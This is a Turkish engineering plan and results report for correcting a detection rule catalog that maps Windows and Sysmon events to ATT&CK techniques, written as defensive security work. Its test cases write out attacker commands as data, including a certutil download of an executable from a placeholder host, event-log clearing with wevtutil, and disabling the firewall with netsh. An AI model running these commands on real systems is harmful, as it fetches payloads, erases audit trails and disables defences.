# Beklenti K1 — kural kataloğu düzeltmesi (K1a, K1a′, K1b–K1d)

**Durum:** beklenti. **Hiçbir kural henüz değiştirilmedi.**
**Dal:** `k1-rule-quality`, taban `d1439f6` (ATT&CK 19.2 verisi).
**Kaynak ölçüm:** `docs/olcum_23_k1_kural_kalitesi.md` (Görev 23) + bu belgenin §2'si.
**Yan etki aracı:** `scripts/measure_k1_side_effect.py` — kataloğu bağlayan
testten SONRA, K1a'dan ÖNCE yazılacak; taban çizgisi
`git show d1439f6:rules/attack_mappings.yaml`'dan okunur, elle kopya tutulmaz.

---

## 0. Bu belge kural değişikliğinden önce yazıldı

Yöntem maddesi: beklenti önce yazılır ve commit'lenir, girdiler ölçülür,
eşikler ve kararlar sonuca bakılarak ayarlanmaz. §3'teki vakalar ve §4'teki
yan etki tahminleri **kural dosyasına dokunulmadan** bağlanmıştır.

`a45c433`'ün dersi gereği beş adım AYRI uygulanır ve AYRI ölçülür
(K1a → ölçüm → K1a′ → ölçüm → K1b → ölçüm → K1c → ölçüm → K1d → ölçüm).
K1a ile K1a′'nün sonuçları birbirine karıştırılmaz. Bir adımın ölçümü
bu belgede tahmin edilmeyen bir değişiklik gösterirse iş durur; tahmin
sonradan düzeltilmez, sapma yazılır.

**Dondurulmuş benchmark KONTROLDÜR ve dokunulmaz:** `evaluation/results/`
(içinde `controlled_attack_19_2/` ve `PROVENANCE.md`), README benchmark
sayıları ve 19.1 benchmark'ı değişmez. Skorlayıcı, prompt'lar, retrieval,
reranker ve LLM seçimi değişmez. K1 sonrasında yapılacak her değerlendirme
ayrı etiketli bir deney olur; dondurulmuş sonucun yerine geçmez ve dondurulmuş
19.2 skoruna (0.672) karşı ayrıca kontrollü bir koşu olmadan skor değişimi
iddia edilmez.

---

## 1. Kapsam

| adım | ne | kapsam kararı |
|---|---|---|
| **K1a** | katalog ID/ad doğruluğu | emekli ve yanlış ID'ler 19.2'nin canlı tekniklerine taşınır (D1, D2 dahil); **genişletme YOK** |
| **K1a′** | taşınan iki kuralın olay kapsamı | T1686'ya güvenlik duvarı yapılandırma olayları, T1685.001'e 7040 (yalnız Event Log hizmeti devre dışı) — D4 (c) |
| **K1b** | tam yol varsayımı | 11 süreç adı koşulu hem tam yolu hem taban adı kabul eder |
| **K1c** | başka tekniğin kanıtını mal etme | `T1140`'tan `-urlcache` çıkar |
| **K1d** | Sysmon/Windows eşdeğer olay | Görev 23'ün 1c listesi, D3'teki düzeltmelerle |

**Kapsam DIŞI — sınıf 3 (ayırt edici koşulu olmayan 12 kural).** Motorda
sayı/zaman penceresi semantiği yok (`T1110.001` bunu gerektiriyor) ve bu
mimaride kural LLM seçimini SÜZER: bir kuralı sıkılaştırmak, doğru seçimlerin
daha sık elenmesi demektir. Ayrı ölçüm/görev olarak kalır.

---

## 2. Ölçülen girdiler (taban çizgisi, `d1439f6`)

**Korpus: 186 kayıt** — G 51 (`g_arm_run_v2.json`), S 60 (`s_arm_run.json`),
H 15 (`h_arm_run.json`), dondurulmuş 19.2'nin 60 senaryosu
(`controlled_attack_19_2/eval_raw_outputs.jsonl`). Satırlar ham girdiden
`text_to_row` ile (G için `row_to_kv_string`), seçimler kayıtlı
`mappings_before_agents`'tan. Kapı yalnızca bugünkü kurallarla yeniden
koşuldu; **bu bir sonuç değil, girdidir.** Dondurulmuş dosyalar OKUNUR,
yazılmaz.

- K1'in dokunduğu tekniklerden en az birini seçen kayıt: **68**.
- Bunların olay ID'si taşımayanları (H'nin 5'i, 60 senaryonun 17'si) bugün
  `abstain` alıyor ve K1'den sonra da alacak: kural olay ID'siyle kapılı.
- **Katalogda emekli/yanlış ID** (19.2 bilgi tabanına karşı):

| kural ID | kuralın gerçekte aradığı | 19.2 |
|---|---|---|
| `T1685.005` | `netsh ... firewall ... off` — ad alanı "Disable or Modify System Firewall" | T1685.005 = **Clear Windows Event Logs** → yanlış teknik |
| `T1070.001` | olay günlüğü temizleme (1102/104, `wevtutil cl`) | **emekli** → T1685.005 |
| `T1562.001` | Defender kapatma (5001/5010/5012/5101) | **emekli** → T1685 |
| `T1562.002` | 1102 temizleme **ve** 4719 denetim politikası | **emekli** → T1685.001 |
| `T1543.001` | `Services\<ad>\ImagePath` registry yazma | T1543.001 = **Launch Agent** (macOS) → yanlış teknik |
| `T1136.001` | 4720 yerel hesap oluşturma | doğru teknik; yalnız ad "Create Local Account" ≠ "Local Account" |

Emekli ID'ler altındaki üç kural bugün hiçbir LLM seçimiyle eşleşemez (model
canlı ID üretir); `T1685.005` seçimi ise **güvenlik duvarı kuralıyla**
sınanıyor. Sonuç dondurulmuş koşuda görünür: `rawlog-009` (1102, "The audit
log was cleared.") — model T1685.005'i doğru seçti, kapı eledi, skor 0.1.

---

## 3. Beklenti vakaları

Her vaka bir test olarak yazılır. Testler kapının gerçek kararını
(`evidence_gate_decisions`) ya da kuralın `row_matches`'ını sınar.

### 3.0 Katalog testi — K1a'dan ÖNCE yazılır, bugün KIRMIZI

Dosya `tests/test_rule_catalog_ids.py`; `requires_attack_data` ile işaretli
(taze public klonda atlanır).

| # | vaka | bugün | K1a sonrası |
|---|---|---|---|
| T0-1 | her kuralın `technique_id`'si 19.2'de var, `revoked`/`deprecated` değil | **KIRMIZI**: T1562.001, T1562.002, T1070.001 | yeşil |
| T0-2 | her kuralın `name`'i bilgi tabanındaki adla aynı | **KIRMIZI**: T1685.005, T1543.001, T1136.001 | yeşil |

Kırmızının kümesi tam olarak bu altı kural olmalı; fazlası ya da eksiği
testin kendisinin kusurudur. K1a′'nün ekleyeceği iki kural da (T1686,
T1685.001 adlarıyla) bu testten geçmelidir.

### 3.1 K1a — ID/ad düzeltmesi (genişletme YOK)

| # | girdi | beklenen |
|---|---|---|
| a1 | `EventID=1102 Message="The audit log was cleared."` | T1685.005 **confirm** |
| a2 | `EventID=4688` komut satırı `wevtutil cl Security` | T1685.005 **confirm** |
| a3 | `EventID=104 Message="The System log file was cleared."` | T1685.005 **confirm** |
| a4 | `EventID=4719 Message="System audit policy was changed."` | T1685.001 **confirm** |
| a5 | a1 girdisi | T1685.001 **reject** — T1685.001 1102 ailesini sahiplenmez |
| a6 | `EventID=4688` komut satırı `netsh advfirewall set allprofiles state off` | T1686 **confirm**; T1685.005 **reject** |
| a7 | `EventID=5001` Defender gerçek zamanlı koruma kapatıldı mesajı | T1685 **confirm** |
| a8 | T1070.001, T1562.001, T1562.002, T1543.001 seçimi, olaylı girdi | kapı **susar** (bu ID'lerde kural kalmadı) |
| a9 (D1) | `EventID=4657` nesne `...\Services\evil\ImagePath` | T1543.003 **confirm** |
| a10 (D1) | `EventID=7045` | T1543.003 **confirm** — ilk T1543.003 kuralı değişmedi |
| a11 (D1) | `EventID=4657` nesne `...\Services\x\Performance` | T1543.003 **reject** — desen `ImagePath` |
| a12 (D2) | `EventID=4720` | T1136.001 **confirm** — ad değişikliği davranışı değiştirmez |
| a13 | mevcut kilit: 51 QRadar satırı | kural motoru **0 teknik** (`test_rule_engine_regression.py` yeşil kalır) |
| a14 | K1a sonunda `EventID=4950` / `4946` → T1686, `EventID=7040` (Event Log devre dışı) → T1685.001 | **reject** — K1a'nın beklenen gerilemesi (§4.1); K1a′ bu vakaları confirm'e çevirir |

**T1685.001'in koşulu (onaylı karar):** `T1562.002`'den taşınırken 1102 ve
"audit log was cleared" kolu ÇIKAR; yalnızca 4719 ve
`audit polic(y|ies).{0,40}changed` kalır.

**K1a'da genişletme YOK (D4 c):** T1686 kuralı yalnız `netsh` komut
satırını, T1685.001 kuralı yalnız 4719'u kapsar. Bunun sonucu olan üç
gerileme (§4.1) **K1a'nın beklenen yan etkisidir** ve K1a ölçümünde öyle
görünmelidir. K1a′ onları ayrı bir değişiklikle ve ayrı bir ölçümle geri
çevirir; iki adımın sayıları tek tabloda birleştirilmez.

### 3.1′ K1a′ — taşınan kuralların olay kapsamı (K1a ölçüldükten SONRA)

İki YENİ kural eklenir; K1a'da taşınan kurallar değişmez (T1053.005'in iki
kuralı gibi, aynı teknik altında ikinci kural).

**T1686 — güvenlik duvarı yapılandırma olayları.** Olay kümesi ve `Message`
koşulu **`T1686.003` kuralınınkiyle birebir aynı**:

- olaylar: **`4946, 4947, 4948, 4949, 4950, 4954, 5025`** (7 olay)
- yasak: `5156, 5158`
- desen: `(?i)(rule (was )?(added|deleted|modified|changed)|setting.{0,30}changed|exception list|was restored to the default|service.{0,20}stopped)`

Böylece T1686 ile alt tekniği aynı kanıtla onaylanır; yeni bir anlam icat
edilmez.

> **Aralık düzeltmesi:** önceki taslak (ve D4 seçenek b'nin metni)
> "4946–4954" yazdı ve bunu T1686.003'ün olay kümesi saydı. Yanlıştı:
> kural kataloğundaki T1686.003 **4951, 4952 ve 4953'ü içermiyor**. Bu üçü
> bir yapılandırma değişikliği değil, bir güvenlik duvarı kuralının *yok
> sayıldığı / kısmen yok sayıldığı / ayrıştırılamadığı* kayıtlarıdır — bir
> aktörün güvenlik duvarını değiştirdiğini göstermezler ve katalogda onları
> yapılandırma değişikliği olarak destekleyen bağımsız bir kanıt yok. K1a′
> yedi olayı kullanır; 4951–4953 eklenmez.

**T1685.001 — 7040, yalnızca Event Log hizmeti devre dışı.** Olay `7040`;
koşul `Message` üzerinde
`(?i)Windows Event Log service was changed from .{0,30} to disabled`.
(`Message`, 4719 kolu gibi `tasinmadi: S` — anlam koşulu.)

| # | girdi | beklenen |
|---|---|---|
| a′1 | `EventID=4950 Message="A Windows Defender Firewall setting has changed. ..."` | T1686 **confirm** |
| a′2 | `EventID=4946 Message="A change has been made to Windows Firewall exception list. A rule was added. ..."` | T1686 **confirm** |
| a′3 | `EventID=5025 Message="The Windows Defender Firewall service has been stopped."` | T1686 **confirm** |
| a′4 | `EventID=5156` "permitted a connection" | T1686 **reject** — trafik kaydı yapılandırma değişikliği değildir |
| a′5 | `EventID=4952` (kuralın bir kısmı yok sayıldı) | T1686 **reject** — kümede yok |
| a′6 | `EventID=4688`, `netsh advfirewall set allprofiles state off` | T1686 **confirm** (K1a kuralı, değişmez) |
| a′7 | `EventID=7040 Message="The start type of the Windows Event Log service was changed from auto start to disabled."` | T1685.001 **confirm** |
| a′8 | `EventID=7040`, başka bir hizmet (ör. `Print Spooler`) devre dışı | T1685.001 **reject** |
| a′9 | `EventID=7040`, Windows Event Log hizmeti `demand start → auto start` | T1685.001 **reject** — devre dışı bırakma değil |
| a′10 | `EventID=4719` | T1685.001 **confirm** (K1a kuralı, değişmez) |
| a′11 | `EventID=1102` | T1685.001 **reject** — a5 K1a′'den sonra da geçerli |
| a′12 | T1686.003'ün mevcut testleri | yeşil kalır; kuralı değişmez |

### 3.2 K1b — tam yol / taban ad

Koşullar: T1059.003, T1018, T1016, T1082, T1047, T1218.010, T1218.011,
T1204.002 (çocuk), T1566.001 (çocuk), T1055 (`must_not_match`), T1560.
Desen biçimi `(?i)(?:^|\\)(<adlar>)\.exe` — bugünkü `\\(<adlar>)\.exe`'nin
**katı üst kümesi**: ters bölü taşıyan her değer bugün eşleşiyorsa yine
eşleşir. Yalnızca "değerin başında taban ad" durumu eklenir.

| # | girdi | beklenen |
|---|---|---|
| b1 | 11 koşulun her biri, `C:\Windows\System32\<ad>.exe` | eşleşir (bugünkü gibi) |
| b2 | 11 koşulun her biri, yalın `<ad>.exe` | eşleşir (bugün eşleşmiyor) |
| b3 | `process.name=notcmd.exe` | T1059.003 koşulu **eşleşmez** |
| b4 | `process.name=powershell.exe`, komut satırında `cmd.exe /c ...` | T1059.003 koşulu **eşleşmez** — ad alanı komut satırını okumaz |
| b5 | T1055, yalın `MsMpEng.exe` | **dışlanır** (bugün dışlanmıyor, ateşliyor) |
| b6 | T1055, tam yol `...\MsMpEng.exe` | dışlanır (bugünkü gibi) |
| b7 | T1055, yalın `evil.exe`, olay 10 | ateşler |
| b8 | Görev 24 Ö5: Office ebeveyn + taban adlı çocuk (`powercfg_4688_brace.json` biçimi) | T1204.002 **ateşler** — Ö5 kapanır |

### 3.3 K1c — `T1140`

| # | girdi | beklenen |
|---|---|---|
| c1 | `certutil -urlcache -split -f http://x/p.exe C:\Users\Public\p.exe` | T1140 **reject**, T1105 **confirm** |
| c2 | `certutil -decode in.b64 out.exe` | T1140 **confirm** |
| c3 | T1105'in deseni | değişmez |

### 3.4 K1d — eşdeğer olay (D3 dahil)

| # | kural | eklenen | vaka → beklenen |
|---|---|---|---|
| d1 | T1059.003 | Sysmon **1** | olay 1, `cmd.exe` → confirm |
| d2 | T1053.005 (schtasks kuralı) | Sysmon **1** | olay 1, `schtasks /create ...` → confirm; `schtasks /query` → reject |
| d3 | T1059.001 (4688 kuralı) | Sysmon **1** | olay 1, `powershell.exe -enc ...` → confirm |
| d4 | T1018 | Sysmon **1** | olay 1, `nltest.exe` → confirm |
| d5 | T1685.005 (eski T1070.001) | Sysmon **1** | olay 1, `wevtutil cl System` → confirm |
| d6 | T1003.001 | Sysmon **10** (11 DEĞİL) | olay 10, `TargetImage=...\lsass.exe` → confirm; başka hedef → reject |
| d7 | T1547.001 | Sysmon **11** + `file.name` kolu (`any_of` ile `object.name`) | olay 11, `...\Start Menu\Programs\Startup\run.vbs` → confirm; olay 11, başka dizin → reject; 4657 Run anahtarı → confirm (değişmez) |
| d8 | T1074 | **4663** + her iki koşula `object.name` kolu | 4663, `object.name=C:\Users\Public\stage.zip` → confirm; 4663, `...\Public\notes.txt` → reject; Sysmon 11 `file.name` ile → confirm (değişmez) |
| d9 | T1003.002 | **değişiklik YOK** | aşağıdaki gerekçe testte ve belgede yazılı |

**D3 — T1003.001 neden 10, 11 değil:** Görev 23'ün tarayıcısı 4663↔11
eşdeğerliğini mekanik uyguladı. LSASS bellek erişiminin Sysmon karşılığı
dosya oluşturma (11) değil **süreç erişimi (10)**'dur; kural zaten
`target.image` alanını okuyor ama olay 10'u listelemiyordu.

**D3 — T1003.002 neden değişmiyor:** 4656/4663 SAM kovanına ERİŞİMİ yazar;
Sysmon 11 bir dosyanın OLUŞTURULMASINI yazar. `\config\SAM` bir dosya olarak
yaratılmaz, okunur — 11 bu davranışın eşdeğeri değildir. `reg save HKLM\SAM`
yolu zaten 4688 ve Sysmon 1 ile kapsanıyor. Dökümün hedef dosyasının
yaratılması (11) ayrı ve adı belirsiz bir gözlemdir; tahminle eklenmez.

**D3 — T1074 neden `object.name` ile birlikte:** 4663'ün anlamlı alanlarında
`file.name` yok (`config/event_semantics.yaml`). Olayı tek başına eklemek
hiç sağlanamayacak bir koşul üretirdi (Görev 23 sınıf 1a); kol eklenmeden
olay eklenmez.

### 3.5 Kilitli kalanlar

`config/rule_field_map.yaml` her kural değişikliğiyle aynı commit'te
güncellenir; `tests/test_rule_field_map.py` her adımda yeşil kalır.
`T1686.003`, `T1110.001` ve sınıf 3'ün 12 kuralı değişmez.

---

## 4. Yan etki tahmini — 186 kayıtlık yeniden koşu

Araç her adımdan sonra bu tahminleri sınar; tahmin dışı her değişiklikte
çıkış kodu 1'dir. Tahminler `d1439f6` tabanına göre BİRİKİMLİDİR; her adımın
kendi katkısı ayrıca raporlanır.

### 4.1 K1a — 11 karar, 10 kayıt

| kayıt | olay | seçim | bugün → sonra | etiket | okuma |
|---|---|---|---|---|---|
| `rawlog-009` (60 senaryo) | 1102 | T1685.005 | reject → **confirm** | T1685.005 | düzelme |
| `S-A-10` | 1102 | T1685.005 | reject → **confirm** | T1685.005 | düzelme |
| `S-ID-07` | 4719 | T1685.001 | susma → **confirm** | T1685.001 | düzelme |
| `S-A-11` | 104 | T1685.001 | susma → **reject** | T1685.005 | yanlış seçim eleniyor |
| `S-ID-09` | 4950 | T1685 | susma → **reject** | T1686 | yanlış seçim eleniyor |
| `G-026` | 4658 | T1685.001 | susma → **reject** | — (INSUFFICIENT_DATA) | yanlış seçim eleniyor |
| `S-EK2-02` | 4657 | T1685.001 | susma → **reject** | — (BENIGN) | yanlış seçim eleniyor |
| `platform-002` (60 senaryo) | yok | T1543.001 | abstain → **susma** | T1543.001 | etkisiz (abstain eşlemeyi değiştirmez) |
| **`S-ID-09`** | 4950 | **T1686** | susma → **reject** | **T1686** | **GERİLEME — beklenen** |
| **`S-ID-10`** | 4946 | **T1686** | susma → **reject** | **T1686** | **GERİLEME — beklenen** |
| **`S-ID-13`** | 7040 | **T1685.001** | susma → **reject** | **T1685.001** | **GERİLEME — beklenen** |

**Üç gerileme tahmin ediliyor, kabul edildi (D4 c) ve saklanmıyor.**
Mekanizma: kapı yalnızca kuralı OLAN teknikte hüküm verir
(`verification.py` 1. durum). Taşımadan önce T1686 ve T1685.001'in kuralı
yoktu, kapı susuyordu; taşınan kurallar dar (T1686 = yalnız `netsh` komut
satırı, T1685.001 = yalnız 4719) ve yapılandırma olaylarındaki (4946/4950,
7040) DOĞRU seçimi eleyecekler. **Bu üç gerilemenin K1a′ tarafından geri
çevrilmesi bekleniyor (§4.1′).** K1a'nın ölçümü onları göstermezse bu da
tahmin dışıdır.

**D1 — T1543.003: DEĞİŞİKLİK TAHMİN EDİLMİYOR, ama izleniyor.** T1543.003'ü
seçen 14 kaydın hiçbiri yeni kuralın olaylarını (4657/13) taşımıyor:
`subtech-002` 4688 (`schtasks /create`), `G-007` 4656 (`...\Performance`),
`S-N-04` 4663, yedi G kaydı 4673; `S-A-06`/`S-A-07`/`S-N-06` (7045/4697)
zaten confirm. **`subtech-002`'nin yeniden koşulan kapı kararı değişirse bu
beklenen bir K1 yan etkisidir, dondurulmuş benchmark'ın değiştirilmesi
DEĞİLDİR** — dondurulmuş dosyalar okunur, yazılmaz. Değişirse sebebi
yazılır; bugünkü girdiye göre değişmemesi gerekir.

**D2 — T1136.001:** `rawlog-002` confirm kalır; 0 değişiklik.

### 4.1′ K1a′ — 3 karar, 3 kayıt (K1a sonucuna karşı ölçülür)

| kayıt | olay | seçim | K1a sonrası → K1a′ sonrası | etiket | okuma |
|---|---|---|---|---|---|
| `S-ID-09` | 4950 | T1686 | reject → **confirm** | T1686 | K1a gerilemesi geri çevrildi |
| `S-ID-10` | 4946 | T1686 | reject → **confirm** | T1686 | K1a gerilemesi geri çevrildi |
| `S-ID-13` | 7040 | T1685.001 | reject → **confirm** | T1685.001 | K1a gerilemesi geri çevrildi |

Değişmeyenler, gerekçesiyle: `S-ID-09`'un T1685 seçimi reject kalır (T1685
kuralına dokunulmuyor); `G-026` (4658), `S-A-11` (104) ve `S-EK2-02` (4657)
T1685.001 için reject kalır — üçü de 7040 değil; `S-ID-07` (4719) confirm
kalır. 186 kaydın hiçbiri 4947/4948/4949/4954/5025 taşıyan bir T1686
seçimi içermiyor; bu olayların etkisi yalnızca §3.1′ vakalarıyla görülür.

### 4.2 K1b — 0 değişiklik

§2'nin 68 kaydının olaylı satırlarında 11 koşulun okuduğu alanların
değeri her yerde tam yol (ters bölülü) ve yeni desen bugünkünün katı üst
kümesi. Taban adlı `process.name` taşıyan iki kayıt (`multi-010`,
`injection-001`, ikisi de `powershell.exe`) 11 koşulun dışındaki T1059.001
desenine gidiyor. **Yani K1b'nin etkisi bu korpusta ölçülemez** (madde 17) —
kanıtı yalnızca §3.2'nin vakaları ve Ö5 fixture'ıdır. "0 değişiklik" bir
kazanç iddiası değildir.

### 4.3 K1c — 0 değişiklik

186 kaydın hiçbirinde T1140 seçilmemiş (`rawlog-005`'te model 19.2 koşusunda
T1204.002'yi seçti). Etki yalnızca §3.3 vakalarıyla görülür.

### 4.4 K1d — 2 karar

| kayıt | olay | seçim | bugün → sonra | etiket |
|---|---|---|---|---|
| `S-A-12` | Sysmon 1 | T1059.001 | reject → **confirm** | T1059.001 |
| `S-A-13` | Sysmon 11 | T1547.001 | reject → **confirm** | T1547.001 |

Değişmeyenler, gerekçesiyle: `S-A-13`'ün T1059.001'i reject kalır (olay 11,
T1059.001'e eklenmiyor); `S-A-14` (Sysmon **8**, T1003.001) reject kalır
(eklenen olay 10); T1003.001'in G kayıtları (4656, `Performance`) reject
kalır. Görev 22'nin üç tekniğinden ikisi (T1059.001, T1547.001) burada
düzelir; üçüncüsü (T1685.005) K1a'da düzelir — Görev 23'ün "1c" teşhisi
T1685.005 için yanlıştı (§5).

### 4.5 Toplam — adım adım, birleştirilmeden

| adım | değişen karar | bunların içinde |
|---|---|---|
| K1a | 11 | 3 beklenen gerileme |
| K1a′ | 3 | K1a'nın 3 gerilemesinin geri çevrilmesi |
| K1b | 0 | korpus ölçemiyor |
| K1c | 0 | korpus ölçemiyor |
| K1d | 2 | — |

`d1439f6`'ya göre net: K1 sonunda gerileme kalmaması beklenir. Bu tabloda
tahmin edilmeyen her değişiklik tahmin dışıdır.

---

## 5. Görev 23 teşhis düzeltmesi (yapılacak)

`docs/olcum_23_k1_kural_kalitesi.md` §5, T1685.005'i sınıf **1c** ("kural
tekniğin olay ailesini kapsamıyor") saydı. Doğrusu: kural **yanlış ID'ye
yazılmış bir güvenlik duvarı kuralıdır**; gerçek günlük temizleme kuralı
emekli `T1070.001` altında duruyordu. Sonuç doğruydu (kural sağlanmıyordu),
sebep yanlıştı — projede "doğru cevap, yanlış sebep" deseninin bir örneği
daha. Belgeye tarihli bir düzeltme eklenir; özgün metin silinmez.

---

## 6. Kararlar

| # | karar | tarih |
|---|---|---|
| D1 | `Services\*\ImagePath` kuralı T1543.001'den **T1543.003**'e ikinci kural olarak (T1574.011 değil) | 2026-09-28 |
| D2 | T1136.001 ad alanı → "Local Account" (yalnız meta veri) | 2026-09-28 |
| D3 | T1003.001 + Sysmon 10; T1003.002 değişmez (gerekçe §3.4); T1074 + 4663 ve `object.name` kolu | 2026-09-28 |
| D4 | seçenek **(c)**: K1a genişletmesiz uygulanır ve ölçülür, üç gerilemesi beklenen yan etki olarak kabul edilir; genişletme ayrı adım **K1a′**'dür, kendi vakaları (§3.1′) ve kendi ölçümüyle (§4.1′) | 2026-09-28 |
| D4-kapsam | K1a′'de T1686 olayları T1686.003'ün yedi olayıdır (4946–4950, 4954, 5025); 4951–4953 eklenmez | 2026-09-28 |

---

## 7. Bu iş bittikten sonra ne DENMEYECEK

- "Benchmark skoru arttı" denmeyecek. Dondurulmuş 19.2 sonucu değişmedi;
  `rawlog-009`'un yeniden koşulan kapı kararı bir skor değildir.
- "Tam yol körlüğü korpusta düzeldi" denmeyecek — korpus onu ölçemiyor (§4.2).
- "Katalog doğru" denmeyecek: sınıf 3'ün 12 kuralı ve Görev 23 §6'nın
  ölçmediği alanlar yerinde duruyor.
- K1a ile K1a′'nün sayıları tek bir "K1 kazancı" olarak toplanmayacak.

---

## 8. SONUÇ (2026-09-28) — beş adım uygulandı, beşi de tahminle birebir

**Bu bölüm sonuçtur; §0–§7 ölçümden ÖNCE yazıldı ve değiştirilmedi.**

| adım | commit | yeni test | yan etki (tabana göre, birikimli) | adımın kendi katkısı | tahmin |
|---|---|---|---|---|---|
| beklenti | `4897db0` | — | — | — | — |
| K1a | `30313ea` | katalog testi (2) + a1–a14 | 11 | 11 (3'ü beklenen gerileme) | birebir |
| K1a′ | `91fd20c` | a′1–a′11 | 11 | 3 (üç gerileme geri çevrildi) | birebir |
| K1b | `3a4eded` | b1–b8 | 11 | 0 | birebir |
| K1c | `61b1f0e` | c1–c3 | 11 | 0 | birebir |
| K1d | `422bdca` | d1–d9 | **13** | 2 | birebir |

- **Katalog testi** K1a'dan önce yazıldı ve tam olarak §3.0'daki altı kuralda
  kırmızıydı; K1a sonrasında yeşil.
- **Her adımın yeni vakaları bir önceki katalogla GERÇEKTEN başarısız**
  (adım öncesi commit'in kuralları `git show` ile yüklenerek sınandı): K1b'de
  b2/b5/b8, K1c'de c1, K1d'de d1/d3–d8 önce `reject`/eşleşmez, sonra
  `confirm`/eşleşir. Adımdan önce de geçen bir test hiçbir şey ölçmez.
- **Görev 24 Ö5 kapandı:** Office ebeveyn + taban adlı çocuk (`brace_kv`
  biçimi) → `T1204.002` `reject → confirm` (K1b).
- **Kural kalitesi tarayıcısı** (`scripts/measure_rule_quality.py`): kural
  49 → 51 (K1a′'nün iki yeni kuralı), farklı teknik 47 → 46 (T1543.003 artık
  iki kurallı), sınıf 2b (aynı bayrak iki teknikte) 1 → 0 ve 2a adayı 3 → 2
  (K1c). Sınıf 3 (12 kural) ve 1a (4 çift) **değişmedi** — kapsam dışıydı.
- **Test takımı:** 1429 → **1501** geçiyor (+2 katalog, +64 davranış
  `tests/test_k1_rule_quality.py`, +6 = K1a′'nün iki yeni harita satırı ×
  `test_rule_field_map.py`'nin üç satır başı sınaması), 0 başarısız.
- **Dondurulmuş benchmark dokunulmadı:** `d1439f6..422bdca` arasında
  `evaluation/`, skorlayıcı, retrieval, prompt, LLM ve README yollarında 0
  dosya değişti; `controlled_attack_19_2/`'nin beş dosyasının commit'li
  hash'leri (`91c8e250…`, `c4cc112d…`, `87619a3f…`, `9ec262a8…`,
  `PROVENANCE.md` `58873156…`) aynı.
- Ölçüm çıktıları: `docs/olcum_k1/yan_etki_<adım>.json` (yalnız kimlik +
  teknik + karar; ham log metni yok).

**Söylenmeyecek olanlar (§7) geçerli:** bu sonuçlar kanıt kapısının
yeniden koşulan kararlarıdır, benchmark skoru değildir. Dondurulmuş 19.2
sonucu (improved 0.672) değişmedi; K1'in skora etkisi ayrı etiketli, kontrollü
bir yeniden koşu olmadan iddia edilmez. K1b ve K1c'nin etkisi korpusta
görünmez (0 karar), kanıtları yalnızca testlerdir.
